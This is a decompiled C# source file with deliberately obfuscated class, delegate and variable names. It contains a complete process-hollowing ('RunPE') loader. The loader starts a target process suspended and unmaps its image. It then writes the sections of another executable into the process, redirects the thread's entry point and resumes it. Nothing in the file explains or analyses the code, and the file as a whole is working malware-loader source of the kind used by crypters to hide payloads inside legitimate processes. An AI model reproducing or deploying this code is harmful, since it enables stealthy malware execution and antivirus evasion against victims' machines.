using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class HLcTNYVRwyigLrzwgwPcUMwviZKNbYrrcbeDkqrPMc
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool zuhXdfaHyJiRhhEwWnZhp(IntPtr pKaJtQUEkRwtRowKcoKmJVwxhBSJizgCP, uint[] Part2);

	public delegate uint DvgWECvnmYoyBJDCK(IntPtr pKaJtQUEkRwtRowKcoKmJVwxhBSJizgCP);

	public delegate uint CZCiNdygPrJPlbZXLQXppEzqzwVxdVdzOFPix(IntPtr pKaJtQUEkRwtRowKcoKmJVwxhBSJizgCP, IntPtr Part2);

	public delegate IntPtr tUOeMLQBShxoYclLGvEBIgfhErOFbMJLxxVonPKKcINQbRZbWPsBWEYX(IntPtr pKaJtQUEkRwtRowKcoKmJVwxhBSJizgCP, IntPtr Part2, IntPtr Part3, int Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool QRQWOpDvtHtHYqnHmRSCJsf(IntPtr pKaJtQUEkRwtRowKcoKmJVwxhBSJizgCP, uint[] Part2);

	public delegate bool HGdCTYlSXdmgxYAVVZxilkMTItVvXYZWzqlHvGqxQhSOpHSEKeKOk(IntPtr pKaJtQUEkRwtRowKcoKmJVwxhBSJizgCP, IntPtr Part2, byte[] Part3, uint Part4, int Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool HBemZYBTyIqfjFBEJuyfoBIbqhMhd(IntPtr pKaJtQUEkRwtRowKcoKmJVwxhBSJizgCP, IntPtr Part2, ref IntPtr Part3, int Part4, ref IntPtr Part5);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool rpuTcOsdBzXqViRlRSHuIBoPTWqhEGVHGqKRzyhYU(string pKaJtQUEkRwtRowKcoKmJVwxhBSJizgCP, StringBuilder Part2, IntPtr Part3, IntPtr Part4, [MarshalAs(UnmanagedType.Bool)] bool Part5, int Part6, IntPtr Part7, string Part8, byte[] Part9, IntPtr[] pKaJtQUEkRwtRowKcoKmJVwxhBSJizgCP0);

	private static zuhXdfaHyJiRhhEwWnZhp zuhXdfaHyJiRhhEwWnZhp_0 = IVbexIlvTusufsIcIsUWxbhIgER<zuhXdfaHyJiRhhEwWnZhp>("kernel32", "SetThreadContext");

	private static DvgWECvnmYoyBJDCK dvgWECvnmYoyBJDCK_0 = IVbexIlvTusufsIcIsUWxbhIgER<DvgWECvnmYoyBJDCK>("kernel32", "ResumeThread");

	private static CZCiNdygPrJPlbZXLQXppEzqzwVxdVdzOFPix czciNdygPrJPlbZXLQXppEzqzwVxdVdzOFPix_0 = IVbexIlvTusufsIcIsUWxbhIgER<CZCiNdygPrJPlbZXLQXppEzqzwVxdVdzOFPix>("ntdll", "NtUnmapViewOfSection");

	private static tUOeMLQBShxoYclLGvEBIgfhErOFbMJLxxVonPKKcINQbRZbWPsBWEYX tUOeMLQBShxoYclLGvEBIgfhErOFbMJLxxVonPKKcINQbRZbWPsBWEYX_0 = IVbexIlvTusufsIcIsUWxbhIgER<tUOeMLQBShxoYclLGvEBIgfhErOFbMJLxxVonPKKcINQbRZbWPsBWEYX>("kernel32", "VirtualAllocEx");

	private static QRQWOpDvtHtHYqnHmRSCJsf qrqwopDvtHtHYqnHmRSCJsf_0 = IVbexIlvTusufsIcIsUWxbhIgER<QRQWOpDvtHtHYqnHmRSCJsf>("kernel32", "GetThreadContext");

	private static HGdCTYlSXdmgxYAVVZxilkMTItVvXYZWzqlHvGqxQhSOpHSEKeKOk hgdCTYlSXdmgxYAVVZxilkMTItVvXYZWzqlHvGqxQhSOpHSEKeKOk_0 = IVbexIlvTusufsIcIsUWxbhIgER<HGdCTYlSXdmgxYAVVZxilkMTItVvXYZWzqlHvGqxQhSOpHSEKeKOk>("kernel32", "WriteProcessMemory");

	private static HBemZYBTyIqfjFBEJuyfoBIbqhMhd hbemZYBTyIqfjFBEJuyfoBIbqhMhd_0 = IVbexIlvTusufsIcIsUWxbhIgER<HBemZYBTyIqfjFBEJuyfoBIbqhMhd>("kernel32", "ReadProcessMemory");

	private static rpuTcOsdBzXqViRlRSHuIBoPTWqhEGVHGqKRzyhYU rpuTcOsdBzXqViRlRSHuIBoPTWqhEGVHGqKRzyhYU_0 = IVbexIlvTusufsIcIsUWxbhIgER<rpuTcOsdBzXqViRlRSHuIBoPTWqhEGVHGqKRzyhYU>("kernel32", "CreateProcessA");

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr Handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	public static T IVbexIlvTusufsIcIsUWxbhIgER<T>(string BbKtIEr, string mCLXgtcKSDBmGriPOAXJEhuPojdFAE)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref BbKtIEr), ref mCLXgtcKSDBmGriPOAXJEhuPojdFAE), typeof(T));
	}

	public static bool LYhKYUDdkrcBvgFqYZHKoJVjanmtfg(byte[] zBpzSGDoaTaFkaMpPzHKB, string yNwqCgQUbxOtBmTdTnPEHkBSLEIVxSVu)
	{
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] part = new byte[68];
				int num = BitConverter.ToInt32(zBpzSGDoaTaFkaMpPzHKB, 60);
				int num2 = BitConverter.ToInt16(zBpzSGDoaTaFkaMpPzHKB, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(zBpzSGDoaTaFkaMpPzHKB, num + 84));
				if (rpuTcOsdBzXqViRlRSHuIBoPTWqhEGVHGqKRzyhYU_0(null, new StringBuilder(yNwqCgQUbxOtBmTdTnPEHkBSLEIVxSVu), zero, zero, Part5: false, 4, zero, null, part, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (qrqwopDvtHtHYqnHmRSCJsf_0(array[1], array2))
					{
						IntPtr part2 = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr Part = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr Part2 = IntPtr.Zero;
						if ((hbemZYBTyIqfjFBEJuyfoBIbqhMhd_0(array[0], part2, ref Part, (int)intPtr2, ref Part2) && unchecked((long)czciNdygPrJPlbZXLQXppEzqzwVxdVdzOFPix_0(array[0], Part)) == 0L) ? true : false)
						{
							IntPtr part3 = new IntPtr(BitConverter.ToInt32(zBpzSGDoaTaFkaMpPzHKB, num + 52));
							IntPtr part4 = new IntPtr(BitConverter.ToInt32(zBpzSGDoaTaFkaMpPzHKB, num + 80));
							IntPtr part5 = tUOeMLQBShxoYclLGvEBIgfhErOFbMJLxxVonPKKcINQbRZbWPsBWEYX_0(array[0], part3, part4, 12288, 64);
							int part6 = default(int);
							hgdCTYlSXdmgxYAVVZxilkMTItVvXYZWzqlHvGqxQhSOpHSEKeKOk_0(array[0], part5, zBpzSGDoaTaFkaMpPzHKB, (uint)(int)intPtr, part6);
							int num3 = num2 - 1;
							int num4 = num3;
							int num5 = 0;
							while (true)
							{
								int num6 = num5;
								int num7 = num4;
								if (num6 > num7)
								{
									break;
								}
								int[] array3 = new int[10];
								Buffer.BlockCopy(zBpzSGDoaTaFkaMpPzHKB, num + 248 + num5 * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(zBpzSGDoaTaFkaMpPzHKB, array3[5], array4, 0, array4.Length);
								part4 = new IntPtr(part5.ToInt32() + array3[3]);
								part3 = new IntPtr(array4.Length);
								hgdCTYlSXdmgxYAVVZxilkMTItVvXYZWzqlHvGqxQhSOpHSEKeKOk_0(array[0], part4, array4, (uint)(int)part3, part6);
								num5++;
							}
							part4 = new IntPtr(unchecked((long)array2[41]) + 8L);
							part3 = new IntPtr(4);
							hgdCTYlSXdmgxYAVVZxilkMTItVvXYZWzqlHvGqxQhSOpHSEKeKOk_0(array[0], part4, BitConverter.GetBytes(part5.ToInt32()), (uint)(int)part3, part6);
							array2[44] = (uint)(part5.ToInt32() + BitConverter.ToInt32(zBpzSGDoaTaFkaMpPzHKB, num + 40));
							zuhXdfaHyJiRhhEwWnZhp_0(array[1], array2);
						}
					}
					dvgWECvnmYoyBJDCK_0(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
